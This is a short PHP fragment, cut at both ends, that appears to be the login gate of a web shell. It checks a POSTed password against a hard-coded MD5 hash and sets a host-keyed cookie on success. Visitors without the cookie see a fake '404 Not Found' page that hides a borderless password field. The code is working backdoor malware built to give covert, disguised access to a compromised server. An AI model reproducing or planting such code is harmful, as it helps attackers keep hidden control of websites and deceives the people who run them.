...
$k = 'b779da7ab5c0205f2232c5b28fa39bf6';
if(isset($_POST['p']) && (md5($_POST['p']) == $k)){
    @$_COOKIE[md5($_SERVER['HTTP_HOST'])] = $k;
    @setcookie(md5($_SERVER['HTTP_HOST']), $k);
}

if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $k)){
    die('404 Not Found
...
<form method=post><input style="border: 0; margin:20%;" type=text name=p></form>'
